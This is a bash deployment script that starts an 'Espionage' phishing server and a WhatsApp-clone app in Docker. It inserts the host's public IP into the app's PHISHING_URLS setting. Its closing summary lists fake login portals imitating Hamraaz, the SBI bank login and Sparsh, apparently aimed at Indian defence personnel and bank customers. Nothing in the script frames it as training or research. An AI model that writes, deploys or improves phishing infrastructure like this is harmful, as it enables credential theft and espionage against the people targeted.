#!/bin/bash

# 🚀 Startup Script for Espionage and Whatsapp Servers
# This script will:
# 1. Get the current public IP
# 2. Update env.example with the new IP
# 3. Create .env file from env.example
# 4. Start both Espionage and Whatsapp servers
# 5. Verify both servers are running

set -e  # Exit on error

echo "🚀 Starting Espionage and Whatsapp Servers Setup..."
echo "=================================================="

# Step 1: Get the current public IP
echo "📡 Getting current public IP address..."
PUBLIC_IP=$(curl -s ifconfig.io)

if [ -z "$PUBLIC_IP" ]; then
    echo "❌ Failed to get public IP address. Please check your internet connection."
    exit 1
fi

echo "✅ Public IP address: $PUBLIC_IP"

# Step 2: Update env.example with the new IP
echo "📝 Updating env.example with new IP address..."
ENV_EXAMPLE="./WhatsppClone/env.example"

if [ ! -f "$ENV_EXAMPLE" ]; then
    echo "❌ env.example file not found at $ENV_EXAMPLE"
    exit 1
fi

# Replace the IP in PHISHING_URLS (assuming format: http://OLD_IP:8080/...)
# We'll replace any IP address in the PHISHING_URLS line with the new IP
# Note: Espionage runs on port 8001, so we'll use that port
# First, replace the IP address (keeping the port 8080 temporarily)
sed -i "s|http://[0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+:8080|http://${PUBLIC_IP}:8001|g" "$ENV_EXAMPLE"

echo "✅ Updated env.example with IP: $PUBLIC_IP"

# Step 3: Create .env file from env.example
echo "📋 Creating .env file from env.example..."
# Create .env in root directory (for docker-compose if it reads from there)
ENV_FILE_ROOT="./WhatsppClone/.env"
cp "$ENV_EXAMPLE" "$ENV_FILE_ROOT"
# Also create .env in backend directory (where server.js expects it when running directly)
ENV_FILE_BACKEND="./WhatsppClone/backend/.env"
cp "$ENV_EXAMPLE" "$ENV_FILE_BACKEND"
echo "✅ Created .env files in both root and backend directories"

# Step 4: Start Espionage server
echo "🔨 Starting Espionage server..."
cd ./Espionage

# Check if Docker is running
if ! docker info > /dev/null 2>&1; then
    echo "❌ Docker is not running. Please start Docker first."
    exit 1
fi

# Stop any existing containers
echo "🛑 Stopping any existing Espionage containers..."
docker-compose down 2>/dev/null || true

# Build and start the container
echo "🔨 Building and starting Espionage container..."
docker-compose up --build -d

# Wait for container to start
echo "⏳ Waiting for Espionage container to start..."
sleep 15

# Verify Espionage is running
if docker-compose ps | grep -q "Up"; then
    echo "✅ Espionage server is running on port 8001"
else
    echo "❌ Espionage server failed to start. Check logs with: cd .//Espionage && docker-compose logs"
    exit 1
fi

# Step 5: Start Whatsapp server
echo "🔨 Starting Whatsapp server..."
pwd
cd ../WhatsppClone/

# Stop any existing containers
echo "🛑 Stopping any existing Whatsapp containers..."
docker-compose down 2>/dev/null || true

# Build and start the containers
echo "🔨 Building and starting Whatsapp containers..."
docker-compose up --build -d

# Wait for containers to start
echo "⏳ Waiting for Whatsapp containers to start..."
sleep 20

# Verify Whatsapp services are running
if docker-compose ps | grep -q "Up"; then
    echo "✅ Whatsapp server is running"
    echo "   - Backend API: port 5000"
    echo "   - Frontend: port 8080"
    echo "   - MongoDB: port 27017"
else
    echo "❌ Whatsapp server failed to start. Check logs with: cd ./WhatsppClone && docker-compose logs"
    exit 1
fi

# Step 6: Verify both servers are working
echo ""
echo "🔍 Verifying servers are working..."
echo "===================================="

# Check Espionage
echo "Checking Espionage server..."
ESPIONAGE_STATUS=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8001/ || echo "000")
if [ "$ESPIONAGE_STATUS" = "200" ] || [ "$ESPIONAGE_STATUS" = "301" ] || [ "$ESPIONAGE_STATUS" = "302" ]; then
    echo "✅ Espionage server is responding (HTTP $ESPIONAGE_STATUS)"
else
    echo "⚠️  Espionage server check returned HTTP $ESPIONAGE_STATUS (may still be starting)"
fi

# Check Whatsapp Backend
echo "Checking Whatsapp backend..."
WHATSAPP_BACKEND_STATUS=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:5000/api/health || echo "000")
if [ "$WHATSAPP_BACKEND_STATUS" = "200" ]; then
    echo "✅ Whatsapp backend is responding (HTTP $WHATSAPP_BACKEND_STATUS)"
else
    echo "⚠️  Whatsapp backend check returned HTTP $WHATSAPP_BACKEND_STATUS (may still be starting)"
fi

# Check Whatsapp Frontend
echo "Checking Whatsapp frontend..."
WHATSAPP_FRONTEND_STATUS=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/ || echo "000")
if [ "$WHATSAPP_FRONTEND_STATUS" = "200" ] || [ "$WHATSAPP_FRONTEND_STATUS" = "301" ] || [ "$WHATSAPP_FRONTEND_STATUS" = "302" ]; then
    echo "✅ Whatsapp frontend is responding (HTTP $WHATSAPP_FRONTEND_STATUS)"
else
    echo "⚠️  Whatsapp frontend check returned HTTP $WHATSAPP_FRONTEND_STATUS (may still be starting)"
fi

# Summary
echo ""
echo "=================================================="
echo "🎉 Setup Complete!"
echo "=================================================="
echo ""
echo "🌐 Server URLs:"
echo "   Espionage Portal:  http://${PUBLIC_IP}:8001/"
echo "   Espionage Hamraaz: http://${PUBLIC_IP}:8001/hamraaz/"
echo "   Espionage SBI:     http://${PUBLIC_IP}:8001/sbi-login/"
echo "   Espionage Sparsh:  http://${PUBLIC_IP}:8001/sparsh/"
echo ""
echo "   Whatsapp Backend:  http://${PUBLIC_IP}:5000/api/health"
echo "   Whatsapp Frontend: http://${PUBLIC_IP}:8080/"
echo ""
echo "📋 Useful commands:"
echo "   View Espionage logs:  cd ./Espionage && docker-compose logs -f"
echo "   View Whatsapp logs:   cd ./WhatsppClone && docker-compose logs -f"
echo "   Stop Espionage:       cd ./Espionage && docker-compose down"
echo "   Stop Whatsapp:        cd ./WhatsppClone && docker-compose down"
echo ""
echo "✅ Both servers should be running now!"
echo ""

